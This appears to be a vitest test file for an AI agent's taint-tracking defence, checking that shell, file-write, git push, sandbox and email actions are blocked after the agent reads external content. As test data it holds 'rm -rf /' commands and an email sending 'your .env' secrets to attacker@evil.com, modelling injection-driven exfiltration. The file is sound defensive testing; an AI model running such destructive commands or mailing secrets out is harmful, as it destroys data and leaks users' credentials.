/**
 * Test taint tracking security feature
 * Verifies that dangerous capabilities are blocked after fetching external content
 */

import { describe, it, expect, beforeEach, beforeAll, vi } from 'vitest';

// The allowed (non-blocked) sandbox calls below would otherwise `docker exec` for real.
vi.mock('child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('child_process')>();
  const exec = (_cmd: string, optsOrCb: unknown, maybeCb?: unknown) => {
    const cb = (typeof optsOrCb === 'function' ? optsOrCb : maybeCb) as (
      err: Error | null,
      out?: { stdout: string; stderr: string }
    ) => void;
    cb(null, { stdout: '', stderr: '' });
    return {} as unknown;
  };
  return { ...actual, exec, default: { ...actual, exec } };
});

import {
  capabilityExecutor,
  TAINTING_CAPABILITIES,
  DANGEROUS_WHEN_TAINTED,
  SAFE_ACTIONS_WHEN_TAINTED,
} from '../../src/engine/5-tool-loop/execute.js';
import { capabilityBootstrap } from '../../src/engine/5-tool-loop/register-tools.js';
import { capabilityRegistry, TOOL_ALIASES } from '../../src/engine/5-tool-loop/registry.js';
import { OrchestrationContext, ExtractedCapability } from '../../src/engine/2-turn/types.js';

describe('Taint sets name only registered canonical tools', () => {
  beforeAll(() => {
    capabilityBootstrap.initializeCapabilityRegistry();
  });

  it('every taint-set name is registered and is not an alias', () => {
    const registered = new Set(capabilityRegistry.list().map((c) => c.name));
    const names = [
      ...TAINTING_CAPABILITIES,
      ...DANGEROUS_WHEN_TAINTED,
      ...Object.keys(SAFE_ACTIONS_WHEN_TAINTED),
    ];
    for (const name of names) {
      expect(registered.has(name), `${name} is not a registered tool`).toBe(true);
      expect(TOOL_ALIASES[name], `${name} is an alias, not canonical`).toBeUndefined();
    }
  });

  it("sandbox's taint-safe actions are real sandbox actions", () => {
    const sandbox = capabilityRegistry.list().find((c) => c.name === 'sandbox')!;
    for (const action of SAFE_ACTIONS_WHEN_TAINTED.sandbox) {
      expect(sandbox.supportedActions).toContain(action);
    }
  });
});

describe('Taint Tracking Security', () => {
  let context: OrchestrationContext;

  beforeEach(() => {
    context = {
      messageId: 'test-123',
      userId: 'test-user',
      originalMessage: 'test message',
      source: 'test',
      capabilities: [],
      results: [],
      currentStep: 0,
      respondTo: async () => {},
      capabilityFailureCount: new Map(),
      taintedByExternalContent: false,
      taintSource: undefined,
    };
  });

  describe('when context is NOT tainted', () => {
    it('should allow shell capability', async () => {
      const shellCap: ExtractedCapability = {
        name: 'shell',
        action: 'exec',
        params: { command: 'echo hello' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        shellCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      // Should attempt execution (may fail for other reasons, but not taint block).
      // child_process is mocked above, so it now actually succeeds instead of failing on docker.
      expect(result.error || '').not.toContain('SECURITY');
      expect(result.error || '').not.toContain('tainted');
      expect(result.success).toBe(true);
    });
  });

  describe('when context IS tainted', () => {
    beforeEach(() => {
      context.taintedByExternalContent = true;
      context.taintSource = 'moltbook:feed';
    });

    it('should block shell capability', async () => {
      const shellCap: ExtractedCapability = {
        name: 'shell',
        action: 'exec',
        params: { command: 'rm -rf /' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        shellCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('SECURITY');
      expect(result.error).toContain('tainted');
      expect(result.error).toContain('moltbook:feed');
    });

    it('should block filesystem write but allow read', async () => {
      const writeCap: ExtractedCapability = {
        name: 'filesystem',
        action: 'write',
        params: { path: '/tmp/evil.txt', content: 'malicious' },
        priority: 0,
      };

      const writeResult = await capabilityExecutor.executeCapability(
        writeCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(writeResult.success).toBe(false);
      expect(writeResult.error).toContain('SECURITY');

      // Read should be allowed
      const readCap: ExtractedCapability = {
        name: 'filesystem',
        action: 'read',
        params: { path: '/tmp/test.txt' },
        priority: 0,
      };

      const readResult = await capabilityExecutor.executeCapability(
        readCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      // Should not be blocked by taint (may fail for other reasons)
      expect(readResult.error || '').not.toContain('SECURITY');
      expect(readResult.error || '').not.toContain('tainted');
    });

    it('should block git push but allow git status', async () => {
      const pushCap: ExtractedCapability = {
        name: 'git',
        action: 'push',
        params: {},
        priority: 0,
      };

      const pushResult = await capabilityExecutor.executeCapability(
        pushCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(pushResult.success).toBe(false);
      expect(pushResult.error).toContain('SECURITY');

      // Status should be allowed
      const statusCap: ExtractedCapability = {
        name: 'git',
        action: 'status',
        params: {},
        priority: 0,
      };

      const statusResult = await capabilityExecutor.executeCapability(
        statusCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(statusResult.error || '').not.toContain('SECURITY');
    });

    it('should allow calculator capability (non-dangerous)', async () => {
      const calculatorCap: ExtractedCapability = {
        name: 'calculator',
        action: 'calculate',
        params: { expression: '2 + 2' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        calculatorCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      // Should not be blocked by taint
      expect(result.error || '').not.toContain('SECURITY');
      expect(result.error || '').not.toContain('tainted');
    });

    it('blocks sandbox:exec and sandbox writes by canonical name, allows sandbox reads', async () => {
      for (const action of ['exec', 'send', 'replace', 'insert', 'delete', 'read_pane']) {
        const blocked = await capabilityExecutor.executeCapability(
          { name: 'sandbox', action, params: { command: 'rm -rf /', file: '/x' }, priority: 0 },
          context,
          (cap, err) => `Error: ${err}`
        );
        expect(blocked.success, `sandbox:${action}`).toBe(false);
        expect(blocked.error, `sandbox:${action}`).toContain('SECURITY');
      }

      // The old edit:read (now read_file) was never taint-blocked; still isn't.
      const read = await capabilityExecutor.executeCapability(
        { name: 'edit', action: 'read', params: { file: '/workspace/x' }, priority: 0 },
        context,
        (cap, err) => `Error: ${err}`
      );
      expect(read.capability.name).toBe('sandbox');
      expect(read.capability.action).toBe('read_file');
      expect(read.error || '').not.toContain('SECURITY');
    });

    it('should block email capability', async () => {
      const emailCap: ExtractedCapability = {
        name: 'email',
        action: 'send',
        params: { to: 'attacker@evil.com', subject: 'secrets', body: 'your .env' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        emailCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('SECURITY');
    });
  });
});
